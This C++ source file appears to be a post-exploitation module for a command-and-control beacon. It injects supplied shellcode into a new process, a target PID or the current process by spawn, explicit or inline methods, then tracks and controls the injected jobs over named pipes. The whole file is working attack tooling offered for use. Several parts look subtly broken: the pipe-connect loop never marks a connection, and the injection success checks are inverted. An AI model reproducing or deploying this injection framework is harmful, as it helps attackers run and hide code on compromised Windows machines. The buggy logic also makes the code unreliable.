#include "../kit/kit_process_creation.cc"
#include "../kit/kit_spawn_inject.cc"
#include "../kit/kit_explicit_inject.cc"

typedef ULONG ERROR_CODE;

// ==================== POSTEX ====================

// Beacon -> Module
#define CMD_RESUME              0x01
#define CMD_SUSPEND             0x02
#define CMD_KILL                0x03
#define CMD_OUTPUT              0x05

// Module -> Beacon
#define MSG_READY               0x10
#define MSG_OUTPUT              0x11
#define MSG_STATE               0x12
#define MSG_END                 0x13
#define MSG_RAW                 0x14

// States
#define STATE_RUNNING           0x01
#define STATE_SUSPENDED         0x02
#define STATE_COMPLETED         0x03
#define STATE_DEAD              0x04

#pragma pack(push, 1)

// Beacon -> Module
typedef struct _PIPE_CMD {
    UINT32 magic;
    UINT32 cmd;
} PIPE_CMD, *PPIPE_CMD;

// Module -> Beacon 
typedef struct _PIPE_MSG {
    UINT64 magic;
    UINT32 type;
    struct {
        UINT32 state    : 4; 
        BOOL   nfree    : 1;
        BOOL   exit     : 1;
    };

    UINT32 exit_code; 
} PIPE_MSG, *PPIPE_MSG;

#pragma pack(pop)

// method
#define POSTEX_METHOD_INLINE    0x000
#define POSTEX_METHOD_EXPLICIT  0x100
#define POSTEX_METHOD_SPAWN     0x200

// inf
#define POSTEX_LIST_HANDLE      "\x7f\x3a\x9c\xe1\x4b\x8d\x2f\xa6"
#define POSTEX_COUNT_HANDLE     "\x8e\x4b\x2d\xf7\x5c\x9a\x3e\xb1"
#define POSTEX_MAX_FAILURES     8

// postex action id
#define POSTEX_ACTION_CLEANUP 0x10
#define POSTEX_ACTION_INJECT  0x11
#define POSTEX_ACTION_POLL    0x12
#define POSTEX_ACTION_LIST    0x13
#define POSTEX_ACTION_SUSPEND 0x14
#define POSTEX_ACTION_RESUME  0x15
#define POSTEX_ACTION_KILL    0x16

typedef struct _POSTEX_OBJECT {
    struct _POSTEX_OBJECT* next;
    struct _POSTEX_OBJECT* prev;

    UINT64 id;
    ULONG  pid;
    ULONG  method;
    ULONG  state;

    WCHAR  pipename[64];
    HANDLE pipe;

    HANDLE process_handle;
    HANDLE thread_handle;

    PVOID  remote_base;
    SIZE_T remote_size;

    UINT8  failures;
    UINT8  connected;
    UINT8  need_free;
} POSTEX_OBJECT, *PPOSTEX_OBJECT;

typedef struct _POSTEX_LIST {
    PPOSTEX_OBJECT head;
    PPOSTEX_OBJECT tail;
    UINT32         count;
    UINT32         next_id;
} POSTEX_LIST, *PPOSTEX_LIST;

namespace postex {
    auto poll( void ) -> ULONG;
    auto checkalive( _In_ PPOSTEX_OBJECT obj ) -> void;

    auto listget( void ) -> POSTEX_LIST*;
    auto find( _In_ ULONG id ) -> POSTEX_OBJECT*;

    auto inject_spawn( _In_ PBYTE shellcode, _In_ INT32 size, _In_ POSTEX_OBJECT* obj ) -> ERROR_CODE;
    auto inject_explicit( _In_ UINT32 pid, _In_ PBYTE shellcode, _In_ INT32 size, _In_ POSTEX_OBJECT* obj ) -> ERROR_CODE;
    auto inject_inline( _In_ PBYTE shellcode, _In_ INT32 size, _In_ POSTEX_OBJECT* obj ) -> ERROR_CODE;

    auto create( _In_ WCHAR* prefix_pipe, _In_ ULONG method, _In_ ULONG id ) -> POSTEX_OBJECT*;
    auto add( _In_ POSTEX_OBJECT* obj ) -> void;
    auto rm( _In_ POSTEX_OBJECT* obj ) -> void;

    auto pipe_connect( _In_ POSTEX_OBJECT* obj, _In_ DWORD timeout_ms ) -> ERROR_CODE;
    auto pipe_read( _In_ POSTEX_OBJECT* obj ) -> void;
    auto pipe_send( _In_ POSTEX_OBJECT* obj, _In_ ULONG cmd ) -> ERROR_CODE;
    auto pipe_disconnect( _In_ POSTEX_OBJECT* obj ) -> void;

    auto destroy( _In_ POSTEX_OBJECT* obj ) -> void;
    auto cleanup( _In_ POSTEX_OBJECT* obj ) -> void;
    auto memory_free( _In_ POSTEX_OBJECT* obj ) -> ERROR_CODE;
}

auto postex::listget() -> POSTEX_LIST* {
    POSTEX_LIST* list = (POSTEX_LIST*)BeaconGetValue( POSTEX_LIST_HANDLE );
    
    if ( ! list ) {
        list = (POSTEX_LIST*)malloc( sizeof(POSTEX_LIST) );
        if ( list ) {
            memset( list, 0, sizeof(POSTEX_LIST) );
            list->next_id = 1;
            BeaconAddValue( POSTEX_LIST_HANDLE, list );
        }
    }
    
    return list;
}

auto postex::find( 
    _In_ ULONG id 
) -> POSTEX_OBJECT* {
    POSTEX_LIST* list = postex::listget();

    for ( POSTEX_OBJECT* obj = list->head; obj; obj = obj->next ) {
        if ( obj->id == id ) return obj;
    }

    return nullptr;
}

auto postex::add( 
    _In_ POSTEX_OBJECT* obj 
) -> void {
    PPOSTEX_LIST list = postex::listget();
    
    obj->next = nullptr;
    obj->prev = list->tail;

    if ( list->tail ) list->tail->next = obj;
    else              list->head = obj;
    
    list->tail = obj;
    list->count++;
}

auto postex::rm( 
    _In_ POSTEX_OBJECT* obj 
) -> void {
    POSTEX_LIST* list = postex::listget();

    if ( obj->prev ) obj->prev->next = obj->next;
    else             list->head = obj->next;

    if ( obj->next ) obj->next->prev = obj->prev;
    else             list->tail = obj->prev;

    list->count--;
}

auto postex::pipe_disconnect( 
    _In_ POSTEX_OBJECT* obj 
) -> void {

    if ( obj->pipe && obj->pipe != INVALID_HANDLE_VALUE ) {
        CloseHandle( obj->pipe );
        obj->pipe = nullptr;
    }

    obj->connected = FALSE;
}

auto postex::memory_free( 
    _In_ POSTEX_OBJECT* obj 
) -> ERROR_CODE {
    if ( obj->need_free && obj->process_handle && obj->remote_base ) {

        SIZE_T region_size = 0;
        ULONG  memory_type = 0;

        MEMORY_BASIC_INFORMATION mbi = {};

        if ( ! VirtualQuery( obj->remote_base, &mbi, sizeof(mbi) ) ) {
            return GetLastError();
        }

        switch ( mbi.Type ) {
            case MEM_IMAGE: {
                break;
            }
            case MEM_MAPPED: {
                break;
            }
            case MEM_PRIVATE: {
                if ( ! VirtualFreeEx(
                    obj->process_handle, obj->remote_base, obj->remote_size, MEM_RELEASE
                )) {
                    return GetLastError();
                }
            }
        }

        obj->remote_base = nullptr;
        obj->remote_size = 0;
        obj->need_free   = FALSE;

        BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] remote memory freed", obj->id );
    }
}

auto postex::cleanup( POSTEX_OBJECT* obj ) -> void {
    postex::pipe_disconnect(  obj );
    postex::memory_free( obj );

    if ( obj->thread_handle  ) { CloseHandle( obj->thread_handle  ); obj->thread_handle  = nullptr; }
    if ( obj->process_handle ) { CloseHandle( obj->process_handle ); obj->process_handle = nullptr; }
}

auto postex::destroy( 
    _In_ POSTEX_OBJECT* obj 
) -> void {
    postex::rm( obj );
    postex::cleanup( obj );
    free(obj);
}

auto postex::create( 
    _In_ WCHAR* prefix_pipe,
    _In_ ULONG  method, 
    _In_ ULONG  id 
) -> POSTEX_OBJECT* {
    POSTEX_OBJECT* obj = (POSTEX_OBJECT*)malloc( sizeof(POSTEX_OBJECT) );
    if ( ! obj ) return nullptr;

    memset(obj, 0, sizeof(POSTEX_OBJECT));
    obj->method = method;
    obj->state  = STATE_RUNNING;
    obj->id     = id;

    // _swprintf( obj->pipename, L"%s_%llX", prefix_pipe, id);
    sprintf( (PCHAR)obj->pipename, "%s_%llX", prefix_pipe, id);

    return obj;
}

// ==================== PIPE ====================

auto postex::pipe_connect( 
    _In_ POSTEX_OBJECT* obj, 
    _In_ DWORD          timeout_ms
) -> ERROR_CODE {
    if ( obj->connected ) return TRUE;

    DWORD start = GetTickCount();

    while ( GetTickCount() - start < timeout_ms ) {
        if ( WaitNamedPipeW(obj->pipename, 1000) ) {
            obj->pipe = CreateFileW(
                obj->pipename,
                GENERIC_READ | GENERIC_WRITE,
                0, nullptr, OPEN_EXISTING, 0, nullptr
            );
        }

        WaitForSingleObject( nt_current_process(), 100 );
    }

    return FALSE;
}

auto postex::pipe_send(
    _In_ POSTEX_OBJECT* obj, 
    _In_ ULONG          cmd
) -> ERROR_CODE {
    if ( ! obj || ! obj->connected || ! obj->pipe ) return FALSE;

    PIPE_CMD pkt = {};
    pkt.magic = obj->id;
    pkt.cmd   = cmd;

    DWORD written;
    if ( ! WriteFile( obj->pipe, &pkt, sizeof(pkt), &written, nullptr ) ) {
        obj->failures++;
        if ( obj->failures >= POSTEX_MAX_FAILURES ) {
            obj->state = STATE_DEAD;
        }
        return FALSE;
    }

    obj->failures = 0;
    return TRUE;
}

auto postex::pipe_read(
    _In_ POSTEX_OBJECT* obj
) -> void {
    if ( ! obj || ! obj->connected || ! obj->pipe ) return;

    DWORD available  = 0;
    DWORD bytes_read = 0;
    PBYTE buffer     = nullptr;

    if ( ! PeekNamedPipe( obj->pipe, nullptr, 0, nullptr, &available, nullptr ) ) {
        obj->failures++;
        if ( obj->failures >= POSTEX_MAX_FAILURES ) {
            obj->state = STATE_DEAD;
        }
        return;
    }

    if ( available == 0 ) return;

    buffer = (PBYTE)malloc( available );
    if ( ! buffer ) return;

    if ( ! ReadFile( obj->pipe, buffer, available, &bytes_read, nullptr ) || bytes_read == 0 ) {
        free( buffer ); obj->failures++; return;
    }

    obj->failures = 0;

    if ( bytes_read && *((ULONG*)buffer) != obj->id ) {
        BeaconPkgInt32( MSG_RAW );
        BeaconPkgBytes( buffer, bytes_read );
    } else if ( bytes_read >= sizeof(PIPE_MSG) ) {
        PPIPE_MSG msg = (PPIPE_MSG)buffer;

        if ( msg->magic == obj->id ) {
            if ( msg->nfree ) {
                obj->need_free = TRUE;
            }

            BeaconPkgInt32( msg->type );

            switch ( msg->type ) {
                case MSG_READY:
                    obj->state = STATE_RUNNING;
                    BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] ready", obj->id );
                    break;

                case MSG_OUTPUT:
                    if ( bytes_read > sizeof(PIPE_MSG) ) {
                        BeaconPkgInt32( msg->exit_code );
                        BeaconPkgBytes( (buffer + sizeof(PIPE_MSG)), bytes_read - sizeof(PIPE_MSG) );
                    }
                    break;

                case MSG_STATE:
                    obj->state = msg->state;
                    break;

                case MSG_END:
                    obj->state = STATE_COMPLETED;
                    BeaconPkgInt32( msg->exit_code );
                    BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] completed (exit: %d, free: %s)", obj->id, msg->exit_code, msg->nfree ? "yes" : "no" );
                    break;
            }

            free( buffer );
            return;
        }
    }

    BeaconOutput( CALLBACK_OUTPUT, (char*)buffer, bytes_read );
    free( buffer );
}

// ==================== POLL ====================

auto postex::checkalive(
    _In_ PPOSTEX_OBJECT obj
) -> void {
    if ( obj->process_handle ) {
        DWORD exit_code;
        if ( GetExitCodeProcess( obj->process_handle, &exit_code ) && exit_code != STILL_ACTIVE ) {
            obj->state = STATE_COMPLETED;
        }
    }

    if ( obj->thread_handle ) {
        DWORD exit_code;
        if ( GetExitCodeThread( obj->thread_handle, &exit_code ) && exit_code != STILL_ACTIVE ) {
            obj->state = STATE_COMPLETED;
        }
    }
}

auto postex::poll( void ) -> ULONG {
    POSTEX_LIST* list = postex::listget();
    
    POSTEX_OBJECT* obj = list->head;
    while ( obj ) {
        POSTEX_OBJECT* next = obj->next;

        if ( ! obj->connected ) {
            if ( postex::pipe_connect( obj, 500 ) ) {
                BeaconPrintf(CALLBACK_OUTPUT, "[postex-%llX] connected", obj->id);
            }
        }

        if ( obj->connected ) {
            postex::pipe_read( obj );
        }

        postex::checkalive( obj );

        if ( obj->state == STATE_COMPLETED && obj->failures == POSTEX_MAX_FAILURES ) {
            postex::pipe_read( obj );
            postex::destroy( obj );
        }

        obj = next;
    }

    return list->count;
}

// ==================== INJECTION ====================

auto postex::inject_spawn(
    _In_ PBYTE          shellcode, 
    _In_ INT32          size, 
    _In_ POSTEX_OBJECT* obj
) -> ERROR_CODE {
    PS_CREATE_ARGS      args    = { .state = CREATE_SUSPENDED };
    PROCESS_INFORMATION ps_info = {};

    ERROR_CODE code = SpawnInjection( shellcode, size, nullptr, &args );
    
    if ( code == ERROR_SUCCESS ) {
        obj->process_handle = ps_info.hProcess;
        obj->thread_handle  = ps_info.hThread;
    }

    return code;
}

auto postex::inject_explicit(
    UINT32 pid, PBYTE shellcode, INT32 size, PPOSTEX_OBJECT obj
) -> ERROR_CODE {
    PROCESS_INFORMATION ps_info = {};

    ERROR_CODE code = ExplicitInjection( pid, FALSE, shellcode, size, nullptr, &ps_info );

    obj->process_handle = ps_info.hProcess;
    obj->thread_handle  = ps_info.hThread;

    return code;
}

auto postex::inject_inline(
    _In_ PBYTE          shellcode, 
    _In_ INT32          size, 
    _In_ POSTEX_OBJECT* obj
) -> ERROR_CODE {
    return ExplicitInjection( (INT64)nt_current_process(), FALSE, shellcode, size, nullptr, nullptr );
}

typedef struct _POSTEX_HEADER {
    ULONG  id;
    INT16  execmethod;
    INT8   spoof;
    INT8   bypassflag;
    ULONG  pipename_len;
    WCHAR* pipename;
    ULONG  argc;
    PBYTE  args;
} POSTEX_HEADER;

extern "C" auto go_inject( char* args, int argc ) -> BOOL {
    datap parser = {};

    BeaconDataParse( &parser, args, argc );

    UINT32 method = BeaconDataInt( &parser );
    UINT32 pid    = BeaconDataInt( &parser );
    INT32  sc_len = 0;
    PBYTE  sc     = (PBYTE)BeaconDataExtract( &parser, &sc_len );
    INT32  arglen = 0;
    PBYTE  argbuf = (PBYTE)BeaconDataExtract( &parser, &arglen );

    UINT32 postex_id = 0;
    BEACON_INFO info = {};

    BeaconInformation( &info );

    ULONG seed = GetTickCount();
    postex_id = RtlRandomEx( &seed );

    DbgPrint( "postex id: %x\n", postex_id );

    DbgPrint("pipe: %s\n", info.Config->Postex.ForkPipe);

    POSTEX_OBJECT* obj = postex::create( info.Config->Postex.ForkPipe, method, postex_id );
    if ( ! obj ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to create postex object" );
        return FALSE;
    }

    // Calculate sizes dynamically
    // ULONG pipename_len = wcslen( info.Config->Postex.ForkPipe ) * sizeof(WCHAR);
    ULONG pipename_len = strlen( (PCHAR)obj->pipename ) * sizeof(CHAR);
    
    // Calculate header size based on struct layout
    ULONG header_size = offsetof(POSTEX_HEADER, pipename) +   // Fixed fields up to pipename
                        sizeof(ULONG) +                       // pipename_len field
                        pipename_len +                        // pipename buffer
                        sizeof(ULONG) +                       // argc field
                        arglen;                               // args buffer

    ULONG total_size = sc_len + header_size;

    // Allocate buffer for shellcode + header
    PBYTE full_content = (PBYTE)VirtualAlloc( nullptr, total_size, MEM_COMMIT, PAGE_READWRITE );
    if ( ! full_content ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to allocate memory for injection buffer" );
        return FALSE;
    }

    // Copy shellcode
    memcpy( full_content, sc, sc_len );

    // Build header after shellcode
    PBYTE current = full_content + sc_len;

    // Write id (4 bytes)
    *(ULONG*)current = postex_id;
    current += sizeof(ULONG);

    // Write execmethod (2 bytes)
    *(INT16*)current = (INT16)method;
    current += sizeof(INT16);

    // Write spoof (1 byte)
    *(INT8*)current = 0;
    current += sizeof(INT8);

    // Write bypassflag (1 byte)
    *(INT8*)current = 0;
    current += sizeof(INT8);

    // Write pipename_len (4 bytes)
    *(ULONG*)current = pipename_len;
    current += sizeof(ULONG);

    // Write pipename buffer
    memcpy( current, obj->pipename, pipename_len );
    current += pipename_len;

    // Write argc (4 bytes)
    *(ULONG*)current = arglen;
    current += sizeof(ULONG);

    // Write args buffer
    if ( arglen > 0 && argbuf ) {
        memcpy( current, argbuf, arglen );
        current += arglen;
    }

    obj->pid = pid;

    BOOL ok = FALSE;

    switch ( method ) {
        case POSTEX_METHOD_INLINE:
            ok = postex::inject_inline( full_content, total_size, obj );
            break;
        case POSTEX_METHOD_SPAWN:
            ok = postex::inject_spawn( full_content, total_size, obj );
            break;
        case POSTEX_METHOD_EXPLICIT:
            ok = postex::inject_explicit( pid, full_content, total_size, obj );
            break;
        default:
            BeaconPrintf( CALLBACK_ERROR, "Unknown injection method: %d", method );
            break;
    }

    DbgPrint("failed: %X\n", ok);

    // Free the allocated buffer
    VirtualFree( full_content, 0, MEM_RELEASE );

    if ( ! ok ) {
        DbgPrint("success: %X\n", ok);
        postex::add( obj );
        BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] started (method=%d, pid=%d)", obj->id, method, pid );
        BeaconPrintf( CALLBACK_OUTPUT, "\tpipe: %ls", obj->pipename );
    } else {
        DbgPrint("failed: %X\n", ok);
        postex::cleanup( obj );
        free( obj );
        BeaconPrintf( CALLBACK_ERROR, "Injection failed" );
    }

    return ok;
}

// return if need be stop pool
extern "C" BOOL go_poll( char* args, int argc ) {
    UINT32 count = postex::poll();
    
    PUINT32 count_ptr = (PUINT32)BeaconGetValue( POSTEX_COUNT_HANDLE );
    if ( ! count_ptr ) {
        count_ptr = (PUINT32)malloc( sizeof(UINT32) );
        BeaconAddValue( POSTEX_COUNT_HANDLE, count_ptr );
    }

    *count_ptr = count;

    return (count ? FALSE : TRUE);
}

extern "C" void go_suspend( char* args, int argc ) {
    datap parser = {};

    BeaconDataParse( &parser, args, argc );

    ULONG id = BeaconDataInt( &parser ); 

    POSTEX_OBJECT* obj = postex::find( id );
    if ( ! obj ) {
        BeaconPrintf( CALLBACK_ERROR, "postex %llX not found", id );
        return;
    }

    if ( postex::pipe_send( obj, CMD_SUSPEND ) ) {
        BeaconPkgInt32( 0 );
    } else {
        BeaconPkgInt32( 0 );
    }
}

extern "C" void go_resume(char* args, int argc) {
    datap parser = {};

    BeaconDataParse( &parser, args, argc );

    ULONG id = BeaconDataInt( &parser );

    POSTEX_OBJECT* obj = postex::find( id );
    if ( ! obj ) {
        BeaconPrintf( CALLBACK_ERROR, "postex %llX not found", id );
        return;
    }

    auto code = postex::pipe_send( obj, CMD_RESUME );
    BeaconPkgInt32( code );
}

extern "C" void go_kill( char* args, int argc ) {
    datap parser = {};

    BeaconDataParse( &parser, args, argc );

    ULONG id = BeaconDataInt(&parser);

    POSTEX_OBJECT* obj = postex::find( id );
    if ( ! obj ) {
        BeaconPrintf( CALLBACK_ERROR, "postex %llX not found", id );
        return;
    }

    postex::pipe_send( obj, CMD_KILL );

    postex::destroy( obj );

    BeaconPkgInt32( TRUE );
}

extern "C" void go_list( char* args, int argc ) {
    PPOSTEX_LIST list = postex::listget();

    if ( list->count == 0 ) {
        BeaconPrintf( CALLBACK_OUTPUT, "no active postex" );
        return;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "ID\t\t\tMETHOD\t\tSTATE\tPID\tCONN\tFREE");
    BeaconPrintf( CALLBACK_OUTPUT, "----------------\t------\t\t-----\t---\t----\t----");

    for ( PPOSTEX_OBJECT obj = list->head; obj; obj = obj->next ) {
        const char* method_str = "?";
        const char* state_str  = "?";

        switch ( obj->method ) {
            case POSTEX_METHOD_INLINE:   method_str = "INLINE";   break;
            case POSTEX_METHOD_SPAWN:    method_str = "SPAWN";    break;
            case POSTEX_METHOD_EXPLICIT: method_str = "EXPLICIT"; break;
        }

        switch ( obj->state ) {
            case STATE_RUNNING:   state_str = "RUN";  break;
            case STATE_SUSPENDED: state_str = "SUSP"; break;
            case STATE_COMPLETED: state_str = "DONE"; break;
            case STATE_DEAD:      state_str = "DEAD"; break;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%llX\t%s\t\t%s\t%d\t%s\t%s", 
            obj->id, method_str, state_str, obj->pid, 
            obj->connected ? "Y" : "N",
            obj->need_free ? "Y" : "N");
    }
}

extern "C" void go_cleanup( char* args, int argc ) {
    PPOSTEX_LIST list = postex::listget();

    UINT32 killed = 0;
    while ( list->head ) {
        PPOSTEX_OBJECT obj = list->head;
        
        postex::pipe_send( obj, CMD_KILL );
        postex::destroy( obj );

        killed++;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "cleanup: %d postex killed", killed );
}